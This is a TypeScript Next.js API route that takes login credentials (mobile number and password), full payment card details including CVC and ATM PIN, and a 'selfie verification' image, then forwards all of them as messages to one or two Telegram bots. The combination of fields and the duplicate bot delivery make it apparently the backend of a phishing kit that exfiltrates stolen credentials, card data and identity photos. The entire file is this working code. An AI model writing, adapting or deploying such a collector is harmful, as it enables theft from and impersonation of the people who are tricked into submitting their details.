import { NextResponse } from 'next/server'

type TelegramDestination = { botToken: string; chatId: string }

function getDestinations(): TelegramDestination[] {
  const destinations: TelegramDestination[] = []

  if (process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID) {
    destinations.push({
      botToken: process.env.TELEGRAM_BOT_TOKEN,
      chatId: process.env.TELEGRAM_CHAT_ID,
    })
  }

  if (process.env.TELEGRAM_BOT_TOKEN_2 && process.env.TELEGRAM_CHAT_ID_2) {
    destinations.push({
      botToken: process.env.TELEGRAM_BOT_TOKEN_2,
      chatId: process.env.TELEGRAM_CHAT_ID_2,
    })
  }

  return destinations
}

async function sendMessage(botToken: string, chatId: string, text: string) {
  return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text }),
    cache: 'no-store',
  })
}

async function sendPhoto(botToken: string, chatId: string, dataUrl: string, caption: string) {
  const match = /^data:(image\/\w+);base64,(.+)$/.exec(dataUrl)
  if (!match) return null

  const [, mimeType, base64Data] = match
  const buffer = Buffer.from(base64Data, 'base64')
  const form = new FormData()
  form.append('chat_id', chatId)
  form.append('caption', caption)
  form.append('photo', new Blob([buffer], { type: mimeType }), 'selfie.jpg')

  return fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: form,
    cache: 'no-store',
  })
}

// Sends the same message to every configured bot. Succeeds if at least one delivery works.
async function broadcastMessage(destinations: TelegramDestination[], text: string) {
  const results = await Promise.allSettled(
    destinations.map((d) => sendMessage(d.botToken, d.chatId, text)),
  )
  return results.some((r) => r.status === 'fulfilled' && r.value.ok)
}

// Sends the same photo to every configured bot. Succeeds if at least one delivery works.
async function broadcastPhoto(destinations: TelegramDestination[], dataUrl: string, caption: string) {
  const results = await Promise.allSettled(
    destinations.map((d) => sendPhoto(d.botToken, d.chatId, dataUrl, caption)),
  )
  return results.some((r) => r.status === 'fulfilled' && r.value !== null && r.value.ok)
}

function sanitize(value: unknown, maxLength: number) {
  return typeof value === 'string' ? value.trim().slice(0, maxLength) : ''
}

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const type = sanitize(body?.type, 20)

    const destinations = getDestinations()
    if (destinations.length === 0) {
      return NextResponse.json({ error: 'Telegram is not configured' }, { status: 500 })
    }

    let delivered = false

    if (type === 'login') {
      const mobile = sanitize(body?.mobile, 40)
      const password = sanitize(body?.password, 100)
      if (!mobile || !password) {
        return NextResponse.json({ error: 'Invalid login details' }, { status: 400 })
      }
      delivered = await broadcastMessage(
        destinations,
        `🔐 Login Details\nMobile: ${mobile}\nPassword: ${password}`,
      )
    } else if (type === 'card') {
      const cardNumber = sanitize(body?.cardNumber, 25)
      const expiry = sanitize(body?.expiry, 5)
      const cvc = sanitize(body?.cvc, 4)
      const pin = sanitize(body?.pin, 4)
      if (!cardNumber || !expiry || !cvc || !pin) {
        return NextResponse.json({ error: 'Invalid card details' }, { status: 400 })
      }
      delivered = await broadcastMessage(
        destinations,
        `💳 Card Verification\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVC: ${cvc}\nATM PIN: ${pin}`,
      )
    } else if (type === 'selfie') {
      const photo = typeof body?.photo === 'string' ? body.photo : ''
      if (!photo) {
        return NextResponse.json({ error: 'Invalid selfie image' }, { status: 400 })
      }
      delivered = await broadcastPhoto(destinations, photo, '🤳 Selfie Verification submitted')
    } else {
      return NextResponse.json({ error: 'Unknown submission type' }, { status: 400 })
    }

    if (!delivered) {
      return NextResponse.json({ error: 'Unable to send notification' }, { status: 502 })
    }

    return NextResponse.json({ ok: true })
  } catch {
    return NextResponse.json({ error: 'Invalid request' }, { status: 400 })
  }
}
